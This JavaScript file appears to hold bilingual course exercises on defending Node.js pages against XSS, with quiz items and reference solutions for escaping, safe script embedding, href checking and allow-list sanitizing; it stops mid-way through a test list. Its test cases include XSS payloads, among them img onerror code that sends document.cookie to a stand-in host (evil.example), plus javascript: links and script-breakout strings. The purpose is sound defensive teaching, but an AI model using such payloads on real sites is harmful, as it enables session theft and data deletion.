/** Node.js 9.2 — XSS: stored XSS qua ghi chú, httpOnly không phải bản vá, escape vs sanitize, bộ lọc tự chế tự tạo thẻ script. */
import { modul, cs, q, qn, tn, jsBai, nguon, MOI_TRUONG } from './_node-c9-11.mjs';

/* ─── 1. EASY · choice ─── */
const E1 = cs({
  ten: 'XSS: what the script can do, and what really stops it', kho: 'EASY', phut: 10,
  en: 'The lesson ran a stored XSS end to end: an attacker’s note in the Notes feed, a victim with a session cookie, four runs changing one thing at a time, then nine payloads through five strategies. Answer from those measurements.',
  vi: 'Bài chạy một stored XSS từ đầu tới cuối: ghi chú của kẻ tấn công trong bảng tin Notes, nạn nhân có cookie phiên, bốn lượt đổi từng thứ một, rồi chín payload qua năm chiến lược. Trả lời theo các số đo đó.',
  cau: [
    q('x1', ['The session cookie is <code>httpOnly</code>. The stored note contains <code>&lt;script&gt;</code> that does <code>POST /notes/delete-all</code>. What happened in run 4?', 'Cookie phiên là <code>httpOnly</code>. Ghi chú chứa <code>&lt;script&gt;</code> gọi <code>POST /notes/delete-all</code>. Lượt 4 ra sao?'],
      ['The endpoint was called once and the data was gone: the browser attached the cookie by itself', 'Nothing: httpOnly cookies are not sent on requests made by scripts', 'The request was blocked by CORS because it came from a script', 'The script could not run because httpOnly also disables inline scripts'],
      ['httpOnly only stops document.cookie from reading the token. The script runs inside the victim’s session and every same-origin request carries the cookie. It reduces the blast radius; it does not contain an XSS.', 'httpOnly chỉ chặn document.cookie đọc token. Script chạy TRONG phiên của nạn nhân và mọi request cùng nguồn đều mang cookie. Nó thu nhỏ thiệt hại, không chặn được XSS.']),
    q('x2', ['The home-made filter <code>s.replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/gi, \'\')</code> receives <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>. What comes out?', 'Bộ lọc tự chế <code>s.replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/gi, \'\')</code> nhận <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>. Ra cái gì?'],
      ['<code>&lt;script&gt;</code> — removing the inner tag joins the halves into a working one', 'An empty string — the global flag removes every script tag', '<code>alert(1)</code> as plain text — the tags are gone, the body stays', 'The input unchanged — the outer tag is not a valid script tag'],
      ['A single-pass replace on nested input produces exactly what it was written to remove (verified on Node 22: the output is the string &lt;script&gt;). "I wrote a filter" is a red flag.', 'Một lần replace trên dữ liệu lồng nhau tạo ra đúng thứ nó định xoá (kiểm trên Node 22: kết quả là chuỗi &lt;script&gt;). "Tôi đã viết bộ lọc" là dấu hiệu nguy hiểm.']),
    q('x3', ['A field is a display name — plain text, no formatting. What is the right defence?', 'Một trường là tên hiển thị — chữ thường, không định dạng. Cách phòng đúng là gì?'],
      ['Escape it (or let React’s {value} / a template’s {{ }} escape it)', 'Run it through DOMPurify on every render', 'Strip &lt;script&gt; with a regex before saving', 'Store it base64-encoded so the browser cannot parse it'],
      ['Plain text ⇒ escape; you cannot get XSS that way. Sanitizing is for fields that must carry formatting (rich text, rendered markdown).', 'Chữ thường ⇒ escape; theo cách này không thể dính XSS. Sanitize dành cho trường buộc phải mang định dạng (rich text, markdown đã render).']),
    q('x4', ['Why does the lesson prefer sanitizing on READ (at render) over sanitizing once on write?', 'Vì sao bài chọn sanitize lúc ĐỌC (khi render) hơn là một lần lúc ghi?'],
      ['Bypasses are found after data is stored; a patched library then protects old rows too', 'Sanitizing on write is impossible because the database escapes HTML automatically', 'Reading is cheaper: DOMPurify costs 0.2 ms on read and 12 ms on write', 'Rows sanitized on write cannot be searched with full-text indexes'],
      ['On write is cheaper but the rules of that day are frozen into the column forever. On read costs CPU per render, but next month’s DOMPurify fix applies retroactively.', 'Lúc ghi rẻ hơn nhưng luật của hôm đó bị đóng băng vào cột mãi mãi. Lúc đọc tốn CPU mỗi lần render, nhưng bản vá DOMPurify tháng sau áp dụng cả cho dữ liệu cũ.']),
    qn('x5', ['Which of these re-open an XSS after you "fixed" it? (choose all)', 'Cái nào mở lại XSS sau khi bạn đã "sửa"? (chọn mọi câu đúng)'],
      ['<code>element.innerHTML = data</code> somewhere in client code', 'Rendering markdown and trusting it to drop raw HTML', 'Embedding <code>&lt;script&gt;window.__DATA__ = {...}&lt;/script&gt;</code> with a value containing <code>&lt;/script&gt;</code>', 'Building an <code>href</code> from user data by string concatenation', 'Rendering the value with React’s <code>{value}</code>'],
      [0, 1, 2, 3],
      ['The four ways it comes back, from the lesson. React’s {value} escapes by default, so it is the safe one; dangerouslySetInnerHTML is the one that is not.', 'Bốn cách nó quay lại, từ bài. {value} của React tự escape nên là cách an toàn; dangerouslySetInnerHTML mới là cái không an toàn.']),
  ],
  goiY: [['Ask "did a &lt;script&gt; element end up in the DOM?" — that is the only thing that matters.', 'Hỏi "có phần tử &lt;script&gt; nào vào DOM không?" — đó là điều duy nhất quan trọng.'], ['Run the filter on paper: find the first <code>&lt;script&gt;</code>, the first <code>&lt;/script&gt;</code> after it, delete that span, read what is left.', 'Chạy bộ lọc trên giấy: tìm <code>&lt;script&gt;</code> đầu tiên, <code>&lt;/script&gt;</code> đầu tiên sau nó, xoá đoạn đó, đọc phần còn lại.']],
  loi: [['"Our cookie is httpOnly, so XSS cannot hurt us."', '"Cookie của ta là httpOnly nên XSS không làm gì được."'], ['Writing a regex that "strips the dangerous bits" — HTML is not a regular language.', 'Viết regex "lọc phần nguy hiểm" — HTML không phải ngôn ngữ chính quy.']],
  tns: [tn('stored XSS', 'XSS lưu trữ', 'payload nằm trong DB, nổ với mọi người xem'), tn('escape', 'thoát ký tự', '< thành &lt; — dữ liệu hiện ra như chữ'), tn('sanitize', 'làm sạch', 'giữ thẻ mang nghĩa, bỏ thẻ/thuộc tính mang hành vi')],
  kn: ['XSS'],
});

/* ─── 2. EASY · js — escapeHtml ─── */
function escapeHtml(value) {
  // Anything can reach a template (numbers, null…): turn it into a string first.
  return String(value)
    // & MUST go first: otherwise the "&" inside "&lt;" we just produced would be escaped again into "&amp;lt;".
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')    // no new tags can start
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')  // cannot break out of attr="…"
    .replace(/'/g, '&#39;');  // cannot break out of attr='…'
}

const E2 = jsBai({
  ten: 'Escape a note before it reaches the page', kho: 'EASY', phut: 8,
  en: `<p>The Notes feed renders <code>note.body</code> into HTML. The lesson’s strategy for plain-text fields is to <b>escape</b>. Write <code>escapeHtml(value)</code>:</p>
<ul><li>convert <code>value</code> to a string first (<code>String(value)</code>);</li>
<li>replace <code>&amp;</code> → <code>&amp;amp;</code>, <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>"</code> → <code>&amp;quot;</code>, <code>'</code> → <code>&amp;#39;</code> — every occurrence.</li></ul>
<p>The payload <code>&lt;img src=x onerror="fetch(…)"&gt;</code> must come out as text the browser shows, not a tag it runs.</p>${MOI_TRUONG.en}`,
  vi: `<p>Bảng tin Notes render <code>note.body</code> vào HTML. Chiến lược của bài cho trường chữ thường là <b>escape</b>. Viết <code>escapeHtml(value)</code>:</p>
<ul><li>đổi <code>value</code> thành chuỗi trước (<code>String(value)</code>);</li>
<li>thay <code>&amp;</code> → <code>&amp;amp;</code>, <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>"</code> → <code>&amp;quot;</code>, <code>'</code> → <code>&amp;#39;</code> — mọi lần xuất hiện.</li></ul>
<p>Payload <code>&lt;img src=x onerror="fetch(…)"&gt;</code> phải ra thành chữ trình duyệt hiển thị, không phải thẻ nó chạy.</p>${MOI_TRUONG.vi}`,
  goiY: [['Five <code>.replace(/x/g, …)</code> calls chained — the <code>g</code> flag is what replaces every occurrence.', 'Năm lời gọi <code>.replace(/x/g, …)</code> nối nhau — cờ <code>g</code> mới thay mọi lần xuất hiện.'], ['Order matters: which replacement produces a character that another replacement would touch again?', 'Thứ tự quan trọng: phép thay nào sinh ra ký tự mà phép thay khác sẽ đụng lại?']],
  loi: [['Escaping <code>&amp;</code> last: <code>&lt;</code> becomes <code>&amp;amp;lt;</code> and the page shows the literal "&amp;lt;".', 'Escape <code>&amp;</code> sau cùng: <code>&lt;</code> thành <code>&amp;amp;lt;</code> và trang hiện nguyên chữ "&amp;lt;".'], ['<code>s.replace("&lt;", "&amp;lt;")</code> with a string pattern only replaces the FIRST one.', '<code>s.replace("&lt;", "&amp;lt;")</code> với mẫu là chuỗi chỉ thay cái ĐẦU TIÊN.'], ['Skipping quotes: escaped text placed inside <code>title="…"</code> can still break out of the attribute.', 'Bỏ qua dấu nháy: chữ đã escape đặt trong <code>title="…"</code> vẫn thoát được khỏi thuộc tính.']],
  gt: ['Escaping turns every character that has meaning in HTML into an entity, so the parser can only produce text. <code>&amp;</code> goes first because it is the only replacement whose output contains a character from the list. Quotes are escaped so the same function is safe inside attribute values too. This is what React’s <code>{value}</code> does for you.', 'Escape biến mọi ký tự có nghĩa trong HTML thành thực thể, nên bộ phân tích chỉ có thể tạo ra chữ. <code>&amp;</code> đi trước vì nó là phép thay duy nhất mà kết quả chứa một ký tự trong danh sách. Dấu nháy được escape để cùng hàm này an toàn cả trong giá trị thuộc tính. Đây là điều <code>{value}</code> của React làm cho bạn.'],
  kn: ['XSS', 'escaping'],
  tns: [tn('entity', 'thực thể HTML', '&lt; &gt; &amp; &quot; &#39;'), tn('context', 'ngữ cảnh', 'nơi dữ liệu được đặt: chữ, thuộc tính, script…')],
  dau: `/** Escape a value so it renders as text inside HTML. */
function escapeHtml(value) {
  // Write your solution here
  return String(value).replace('<', '&lt;').replace('>', '&gt;');
}
`,
  giai: '// Reference solution\n' + nguon(escapeHtml),
  cases: [
    { goi: `escapeHtml('<img src=x onerror="fetch(\\'https://evil.example/?c=\\'+document.cookie)">')`, moTa: ['The img onerror payload', 'Payload img onerror'] },
    { goi: `escapeHtml('<b>bold</b> & <i>it</i>')`, moTa: ['Every tag, not only the first', 'Mọi thẻ, không chỉ thẻ đầu'] },
    { goi: `escapeHtml('Tom & Jerry')`, moTa: ['A plain ampersand', 'Một dấu & thường'] },
    { goi: `escapeHtml('&lt;already&gt;')`, an: true },
    { goi: `[escapeHtml(42), escapeHtml(null), escapeHtml("it's \\"quoted\\"")]`, an: true },
    { goi: `escapeHtml('<scr<script>ipt>alert(1)</scr</script>ipt>')`, an: true },
  ],
});

/* ─── 3. MEDIUM · js — nhúng dữ liệu vào <script> ─── */
function embedData(data) {
  // JSON.stringify is valid JSON — and valid JSON can still contain "</script>", which ends the <script> block
  // in the HTML parser no matter what the JavaScript inside means. Escape the characters the HTML parser cares
  // about as JSON unicode escapes: JSON.parse turns them back into the same characters, the HTML parser never sees them.
  const json = JSON.stringify(data)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/\u2028/g, '\\u2028')   // line separators: legal in JSON, historically illegal in JS string literals
    .replace(/\u2029/g, '\\u2029');
  return '<script>window.__DATA__ = ' + json + ';</script>';
}

const E3 = jsBai({
  ten: 'Embed server data in a page without breaking out of <script>', kho: 'MEDIUM', phut: 15,
  en: `<p>Way #3 that XSS comes back: <code>&lt;script&gt;window.__DATA__ = {"bio":"…"}&lt;/script&gt;</code> breaks the moment a value contains <code>&lt;/script&gt;</code> — "no matter how valid the JSON is". Write <code>embedData(data)</code> that returns exactly</p>
<pre>&lt;script&gt;window.__DATA__ = &lt;json&gt;;&lt;/script&gt;</pre>
<p>where <code>&lt;json&gt;</code> is <code>JSON.stringify(data)</code> with every <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> written as <code>\\u003c</code>, <code>\\u003e</code>, <code>\\u0026</code> (and U+2028 / U+2029 as <code>\\u2028</code> / <code>\\u2029</code>). The result must still parse back to the same data, and the only <code>&lt;/script</code> in the output must be the closing tag you add.</p>${MOI_TRUONG.en}`,
  vi: `<p>Cách thứ 3 XSS quay lại: <code>&lt;script&gt;window.__DATA__ = {"bio":"…"}&lt;/script&gt;</code> vỡ ngay khi một giá trị chứa <code>&lt;/script&gt;</code> — "JSON hợp lệ tới đâu cũng vậy". Viết <code>embedData(data)</code> trả về đúng</p>
<pre>&lt;script&gt;window.__DATA__ = &lt;json&gt;;&lt;/script&gt;</pre>
<p>trong đó <code>&lt;json&gt;</code> là <code>JSON.stringify(data)</code> với mọi <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> viết thành <code>\\u003c</code>, <code>\\u003e</code>, <code>\\u0026</code> (và U+2028 / U+2029 thành <code>\\u2028</code> / <code>\\u2029</code>). Kết quả vẫn phải đọc lại ra đúng dữ liệu, và <code>&lt;/script</code> duy nhất trong output là thẻ đóng bạn thêm vào.</p>${MOI_TRUONG.vi}`,
  goiY: [['Stringify first, then replace characters in the JSON text — <code>\\u003c</code> inside a JSON string is the same character to <code>JSON.parse</code>.', 'Stringify trước, rồi thay ký tự trong chuỗi JSON — <code>\\u003c</code> trong chuỗi JSON là cùng ký tự đối với <code>JSON.parse</code>.'], ['In your JavaScript source the replacement is the 6-character text <code>\\\\u003c</code> (backslash written twice).', 'Trong mã JavaScript, chuỗi thay thế là 6 ký tự <code>\\\\u003c</code> (dấu gạch ngược viết hai lần).']],
  loi: [['HTML-escaping the JSON (<code>&amp;lt;</code>): inside &lt;script&gt; entities are not decoded, so the data arrives as the literal text "&amp;lt;".', 'Escape kiểu HTML cho JSON (<code>&amp;lt;</code>): trong &lt;script&gt; thực thể không được giải mã nên dữ liệu tới tay là chữ "&amp;lt;".'], ['Escaping only the first <code>&lt;</code> — replace with a string pattern.', 'Chỉ thay <code>&lt;</code> đầu tiên — replace với mẫu là chuỗi.'], ['Writing <code>"\\u003c"</code> with one backslash: that IS the character &lt; again.', 'Viết <code>"\\u003c"</code> với một dấu gạch ngược: đó lại CHÍNH là ký tự &lt;.']],
  gt: ['The HTML parser ends a script block at the first <code>&lt;/script</code>, before JavaScript ever runs, so the danger is in characters, not in the JSON grammar. Writing them as JSON unicode escapes keeps the data identical (JSON.parse decodes <code>\\u003c</code> to <code>&lt;</code>) while making the text invisible to the HTML parser. It is a different context from the page body, which is why <code>escapeHtml</code> would be wrong here.', 'Bộ phân tích HTML kết thúc khối script ở <code>&lt;/script</code> đầu tiên, trước khi JavaScript kịp chạy, nên nguy hiểm nằm ở ký tự, không ở ngữ pháp JSON. Viết chúng thành mã unicode của JSON giữ nguyên dữ liệu (JSON.parse giải <code>\\u003c</code> thành <code>&lt;</code>) mà bộ phân tích HTML không thấy. Đây là ngữ cảnh khác với thân trang, vì vậy dùng <code>escapeHtml</code> ở đây là sai.'],
  kn: ['XSS', 'escaping contexts'],
  tns: [tn('script context', 'ngữ cảnh script', 'dữ liệu nằm trong khối &lt;script&gt;'), tn('unicode escape', 'mã thoát unicode', '\\u003c — cách JSON viết ký tự &lt;')],
  dau: `/** Return '<script>window.__DATA__ = <json>;</script>' that cannot be broken out of. */
function embedData(data) {
  // Write your solution here
  return '<script>window.__DATA__ = ' + JSON.stringify(data) + ';</script>';
}
`,
  giai: '// Reference solution\n' + nguon(embedData),
  cases: [
    { goi: `embedData({ bio: '</script><script>alert(1)</script>' })`, moTa: ['A bio that tries to close the script', 'Tiểu sử cố đóng khối script'] },
    { goi: `embedData({ user: 'An', notes: 3 })`, moTa: ['Harmless data is unchanged except for the wrapper', 'Dữ liệu vô hại giữ nguyên, chỉ thêm vỏ'] },
    { goi: `(() => { const out = embedData({ bio: '</SCRIPT><img src=x onerror=alert(1)>' }); return out.toLowerCase().split('</script').length - 1; })()`, moTa: ['Exactly one "</script" (yours)', 'Đúng một "</script" (của bạn)'] },
    { goi: `(() => { const d = { bio: 'a</script>&<!--', tags: ['<b>', '\\u2028'] }; const out = embedData(d); const json = out.slice('<script>window.__DATA__ = '.length, -';</script>'.length); return [JSON.stringify(JSON.parse(json)) === JSON.stringify(d), /[<>&\\u2028]/.test(json)]; })()`, an: true },
    { goi: `embedData(['<!--', 'x & y', null])`, an: true },
  ],
});

/* ─── 4. MEDIUM · js — href an toàn ─── */
function safeHref(href) {
  // Do NOT test the raw string with a regex: browsers drop leading spaces/control characters and tabs inside the
  // scheme, so " \tjava\tscript:alert(1)" still runs. Let the URL parser normalise it exactly like a browser would.
  let url;
  try {
    url = new URL(String(href), 'https://cuongthai.com/');   // relative links resolve against our own page
  } catch {
    return '#';                                               // not a URL at all
  }
  // Allow-list of schemes, never a deny-list: javascript:, data:, vbscript:, file:… all fail this one check.
  return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? String(href) : '#';
}

const E4 = jsBai({
  ten: 'A link built from user data must not run code', kho: 'MEDIUM', phut: 15,
  en: `<p>Way #4 that XSS comes back: "an <code>href</code> assembled by string concatenation accepts <code>javascript:</code> just fine" — and real sanitizers turned <code>&lt;a href="javascript:alert(1)"&gt;</code> into a bare <code>&lt;a&gt;</code>. Write <code>safeHref(href)</code>:</p>
<ul><li>return <code>href</code> unchanged if, parsed as a URL relative to <code>https://cuongthai.com/</code>, its protocol is <code>http:</code>, <code>https:</code> or <code>mailto:</code> (so <code>/notes/1</code> and <code>#top</code> are fine);</li>
<li>otherwise return <code>"#"</code> — including <code>JaVaScRiPt:</code>, <code>" \\tjavascript:"</code>, <code>java\\tscript:</code>, <code>data:</code> and anything the URL parser rejects.</li></ul>${MOI_TRUONG.en}`,
  vi: `<p>Cách thứ 4 XSS quay lại: "một <code>href</code> ghép bằng nối chuỗi nhận <code>javascript:</code> ngon lành" — và các bộ sanitize thật đã biến <code>&lt;a href="javascript:alert(1)"&gt;</code> thành <code>&lt;a&gt;</code> trơn. Viết <code>safeHref(href)</code>:</p>
<ul><li>trả nguyên <code>href</code> nếu, khi phân tích thành URL tương đối với <code>https://cuongthai.com/</code>, giao thức của nó là <code>http:</code>, <code>https:</code> hoặc <code>mailto:</code> (nên <code>/notes/1</code> và <code>#top</code> được);</li>
<li>ngược lại trả <code>"#"</code> — kể cả <code>JaVaScRiPt:</code>, <code>" \\tjavascript:"</code>, <code>java\\tscript:</code>, <code>data:</code> và mọi thứ bộ phân tích URL từ chối.</li></ul>${MOI_TRUONG.vi}`,
  goiY: [['<code>new URL(href, base)</code> parses like a browser: it lower-cases the scheme and removes the spaces and tabs a browser would ignore.', '<code>new URL(href, base)</code> phân tích như trình duyệt: viết thường scheme và bỏ dấu cách, tab mà trình duyệt bỏ qua.'], ['Wrap it in try/catch — <code>new URL("http://")</code> throws. Then compare <code>url.protocol</code> with an allow-list.', 'Bọc trong try/catch — <code>new URL("http://")</code> ném lỗi. Rồi so <code>url.protocol</code> với danh sách trắng.']],
  loi: [['<code>href.startsWith("javascript:")</code> — fails on upper case, leading spaces and a tab in the middle of the word.', '<code>href.startsWith("javascript:")</code> — trượt với chữ hoa, khoảng trắng đầu và tab giữa chữ.'], ['A deny-list (block javascript:) instead of an allow-list: data: and vbscript: walk through.', 'Danh sách đen (chặn javascript:) thay vì danh sách trắng: data: và vbscript: lọt qua.'], ['Returning the parsed <code>url.href</code>: relative links become absolute and the test expects the original text.', 'Trả <code>url.href</code> đã phân tích: link tương đối thành tuyệt đối trong khi đề yêu cầu chữ gốc.']],
  gt: ['The browser decides what a link does after normalising it, so the check must normalise the same way — the WHATWG URL parser in Node and in the browser strips leading control characters and tabs, and lower-cases the scheme (verified on Node 22: <code>" \\tjavascript:alert(1)"</code> parses to protocol <code>javascript:</code>). Checking the protocol against a short allow-list then covers every executable scheme at once.', 'Trình duyệt quyết định link làm gì SAU khi chuẩn hoá nó, nên phép kiểm phải chuẩn hoá cùng cách — bộ phân tích URL WHATWG trong Node và trình duyệt bỏ ký tự điều khiển đầu chuỗi, tab, và viết thường scheme (kiểm trên Node 22: <code>" \\tjavascript:alert(1)"</code> ra protocol <code>javascript:</code>). So giao thức với một danh sách trắng ngắn thì bao luôn mọi scheme chạy được mã.'],
  kn: ['XSS', 'URL parsing', 'allow-list'],
  tns: [tn('scheme', 'lược đồ URL', 'phần trước dấu hai chấm: https, mailto, javascript'), tn('normalisation', 'chuẩn hoá', 'đưa chuỗi về dạng trình duyệt thật sự hiểu')],
  dau: `/** Return href if it is a safe http(s)/mailto link (absolute or relative), otherwise "#". */
function safeHref(href) {
  // Write your solution here
  if (href.startsWith('javascript:')) return '#';
  return href;
}
`,
  giai: '// Reference solution\n' + nguon(safeHref),
  cases: [
    { goi: `safeHref('https://cuongthai.com/notes/7')`, moTa: ['An https link', 'Một link https'] },
    { goi: `safeHref('javascript:alert(document.cookie)')`, moTa: ['javascript: is refused', 'javascript: bị từ chối'] },
    { goi: `[safeHref('/notes/1'), safeHref('#top'), safeHref('mailto:an@cuongthai.com')]`, moTa: ['Relative links and mailto', 'Link tương đối và mailto'] },
    { goi: `[safeHref('JaVaScRiPt:alert(1)'), safeHref(' \\tjavascript:alert(1)'), safeHref('java\\tscript:alert(1)')]`, an: true },
    { goi: `[safeHref('data:text/html,<script>alert(1)</script>'), safeHref('vbscript:msgbox(1)'), safeHref('http://')]`, an: true },
    { goi: `[safeHref('http://example.com/a?b=c'), safeHref('notes/2'), safeHref('//evil.example/x')]`, an: true },
  ],
});

/* ─── 5. HARD · js — sanitize theo danh sách trắng trên cây đã phân tích ─── */
function sanitize(nodes) {
  const ALLOWED = new Set(['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br', 'code']);
  // Elements whose CONTENT is code or can smuggle markup: drop the element and everything inside it.
  const DROP = new Set(['script', 'style', 'iframe', 'object', 'embed', 'svg', 'math', 'noscript', 'template']);
  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  const okHref = (h) => {
    try { return ['http:', 'https:', 'mailto:'].includes(new URL(String(h), 'https://cuongthai.com/').protocol); } catch { return false; }
  };
  const walk = (list) => list.map((n) => {
    if (typeof n === 'string') return esc(n);                    // text is always escaped on the way out
    const tag = String(n.tag).toLowerCase();
    const kids = n.children || [];
    if (DROP.has(tag)) return '';                                 // behaviour, not meaning: gone, children too
    if (!ALLOWED.has(tag)) return walk(kids);                     // unknown wrapper (div, span, font): keep the text
    let attrs = '';
    // The ONLY attribute kept: href on <a>, and only when it is a safe scheme. on*, style, src… never survive.
    if (tag === 'a' && n.attrs && n.attrs.href !== undefined && okHref(n.attrs.href)) attrs = ' href="' + esc(n.attrs.href) + '"';
    if (tag === 'br') return '<br>';                              // void element: no closing tag, no children
    return '<' + tag + attrs + '>' + walk(kids) + '</' + tag + '>';
  }).join('');
  return walk(nodes);
}

const E5 = jsBai({
  ten: 'Sanitize a parsed note with an allow-list', kho: 'HARD', phut: 30,
  en: `<p>The lesson: sanitizing means "parse it into a DOM, walk it, delete everything not on the allow-list, serialise it back" — keep the markup that carries <i>meaning</i>, drop the markup that carries <i>behaviour</i>. The parsing is done for you: a note arrives as a tree, an array whose items are either a <b>string</b> (text) or an <b>element</b> <code>{ tag, attrs?, children? }</code>. Write <code>sanitize(nodes)</code> → HTML string:</p>
<ul><li>text is escaped (<code>&amp; &lt; &gt; " '</code>);</li>
<li>allowed tags (case-insensitive, output lower-case): <code>p b i em strong a ul ol li br code</code>. <code>br</code> is written <code>&lt;br&gt;</code> with no closing tag;</li>
<li>dropped <b>with their whole content</b>: <code>script style iframe object embed svg math noscript template</code>;</li>
<li>any other tag (<code>div</code>, <code>span</code>, <code>img</code>…) is removed but its children are kept (unwrap);</li>
<li>every attribute is dropped, except <code>href</code> on <code>a</code> when it is an <code>http:</code>/<code>https:</code>/<code>mailto:</code> link (relative links allowed, as in the previous exercise); its value is escaped and written <code>href="…"</code>.</li></ul>
<p>Example: <code>[{tag:'p', children:['Hi ', {tag:'b', attrs:{onclick:'x()'}, children:['An']}]}]</code> → <code>&lt;p&gt;Hi &lt;b&gt;An&lt;/b&gt;&lt;/p&gt;</code>.</p>${MOI_TRUONG.en}`,
  vi: `<p>Bài học: sanitize nghĩa là "phân tích thành DOM, đi qua nó, xoá mọi thứ không có trong danh sách trắng, ghi lại thành chuỗi" — giữ markup mang <i>ý nghĩa</i>, bỏ markup mang <i>hành vi</i>. Phần phân tích đã làm sẵn: ghi chú tới dưới dạng cây, một mảng mà mỗi phần tử là <b>chuỗi</b> (chữ) hoặc <b>phần tử</b> <code>{ tag, attrs?, children? }</code>. Viết <code>sanitize(nodes)</code> → chuỗi HTML:</p>
<ul><li>chữ được escape (<code>&amp; &lt; &gt; " '</code>);</li>
<li>thẻ được phép (không phân biệt hoa thường, ghi ra chữ thường): <code>p b i em strong a ul ol li br code</code>. <code>br</code> ghi là <code>&lt;br&gt;</code>, không có thẻ đóng;</li>
<li>bỏ <b>kèm toàn bộ nội dung</b>: <code>script style iframe object embed svg math noscript template</code>;</li>
<li>thẻ khác (<code>div</code>, <code>span</code>, <code>img</code>…) bị bỏ nhưng giữ con của nó (gỡ vỏ);</li>
<li>bỏ mọi thuộc tính, trừ <code>href</code> trên <code>a</code> khi là link <code>http:</code>/<code>https:</code>/<code>mailto:</code> (cho phép link tương đối, như bài trước); giá trị được escape và ghi <code>href="…"</code>.</li></ul>${MOI_TRUONG.vi}`,
  goiY: [['Write a recursive <code>walk(list)</code> that maps each node to a string and joins them.', 'Viết hàm đệ quy <code>walk(list)</code> biến mỗi nút thành chuỗi rồi nối lại.'], ['Three branches per element: in DROP → <code>""</code>; not allowed → <code>walk(children)</code>; allowed → open tag + <code>walk(children)</code> + close tag.', 'Ba nhánh cho mỗi phần tử: thuộc DROP → <code>""</code>; không được phép → <code>walk(children)</code>; được phép → thẻ mở + <code>walk(children)</code> + thẻ đóng.'], ['Never copy attributes in a loop — build the one attribute you allow, after checking it.', 'Đừng chép thuộc tính bằng vòng lặp — dựng đúng một thuộc tính bạn cho phép, sau khi kiểm.']],
  loi: [['Unwrapping <code>&lt;script&gt;</code> instead of dropping it: its text child <code>alert(1)</code> survives into the note.', 'Gỡ vỏ <code>&lt;script&gt;</code> thay vì bỏ hẳn: con chữ <code>alert(1)</code> của nó còn lại trong ghi chú.'], ['Keeping attributes with a deny-list (remove on*): <code>style</code>, <code>src</code>, <code>formaction</code> slip through.', 'Giữ thuộc tính theo danh sách đen (bỏ on*): <code>style</code>, <code>src</code>, <code>formaction</code> lọt qua.'], ['Forgetting to escape text: a text node <code>"&lt;img onerror=…&gt;"</code> becomes a real tag again when serialised.', 'Quên escape chữ: nút chữ <code>"&lt;img onerror=…&gt;"</code> lại thành thẻ thật khi ghi ra.']],
  gt: ['An allow-list sanitizer cannot be bypassed by a tag or attribute nobody thought of, because anything unknown is removed by default. Dropping executable containers with their content, unwrapping harmless unknown wrappers, and rebuilding the single allowed attribute after a URL check is exactly what the lesson saw sanitize-html and DOMPurify do: <code>&lt;img src=x onerror=…&gt;</code> loses the handler, <code>&lt;a href="javascript:…"&gt;</code> becomes a bare <code>&lt;a&gt;</code>, the legitimate note survives untouched. Serialising from a tree — never editing the string — is why there is no "nested script" trick.', 'Bộ sanitize theo danh sách trắng không thể bị vượt bởi một thẻ hay thuộc tính không ai nghĩ tới, vì cái lạ mặc định bị bỏ. Bỏ hẳn vật chứa mã kèm nội dung, gỡ vỏ các thẻ lạ vô hại, và dựng lại đúng một thuộc tính được phép sau khi kiểm URL chính là điều bài thấy sanitize-html và DOMPurify làm: <code>&lt;img src=x onerror=…&gt;</code> mất trình xử lý, <code>&lt;a href="javascript:…"&gt;</code> thành <code>&lt;a&gt;</code> trơn, ghi chú hợp lệ giữ nguyên. Ghi ra từ một cây — không bao giờ sửa chuỗi — là lý do không có mẹo "script lồng nhau".'],
  kn: ['XSS', 'sanitizing', 'recursion'],
  tns: [tn('allow-list sanitizer', 'bộ làm sạch danh sách trắng', 'chỉ giữ thẻ/thuộc tính được liệt kê'), tn('unwrap', 'gỡ vỏ', 'bỏ thẻ, giữ nội dung bên trong'), tn('serialise', 'tuần tự hoá', 'ghi cây DOM trở lại thành chuỗi HTML')],
  dau: `/** Turn a parsed note tree into safe HTML using an allow-list. */
function sanitize(nodes) {
  // Write your solution here
  return nodes.map((n) => {
    if (typeof n === 'string') return n;
    if (n.tag === 'script') return '';
    const attrs = Object.entries(n.attrs || {}).filter(([k]) => !k.startsWith('on')).map(([k, v]) => ' ' + k + '="' + v + '"').join('');
    return '<' + n.tag + attrs + '>' + sanitize(n.children || []) + '</' + n.tag + '>';
  }).join('');
}
`,
  giai: '// Reference solution\n' + nguon(sanitize),
  cases: [
    { goi: `sanitize([{ tag: 'p', children: ['Hi ', { tag: 'b', attrs: { onclick: 'x()' }, children: ['An'] }] }])`, moTa: ['Handlers are dropped, meaning is kept', 'Bỏ trình xử lý, giữ ý nghĩa'] },
    { goi: `sanitize([{ tag: 'img', attrs: { src: 'x', onerror: "fetch('https://evil.example/?c='+document.cookie)" } }, 'after'])`, moTa: ['img onerror: no tag, no handler', 'img onerror: không thẻ, không trình xử lý'] },
    { goi: `sanitize([{ tag: 'a', attrs: { href: 'javascript:alert(1)' }, children: ['Click here'] }, ' ', { tag: 'a', attrs: { href: 'https://cuongthai.com', target: '_blank' }, children: ['here'] }])`, moTa: ['javascript: href removed, https href kept', 'Bỏ href javascript:, giữ href https'] },
    { goi: `sanitize([{ tag: 'SCRIPT', children: ['alert(1)'] }, { tag: 'svg', attrs: { onload: 'alert(1)' }, children: [{ tag: 'b', children: ['x'] }] }, { tag: 'div', attrs: { style: 'color:red' }, children: [{ tag: 'P', children: ['ok'] }] }])`, an: true },
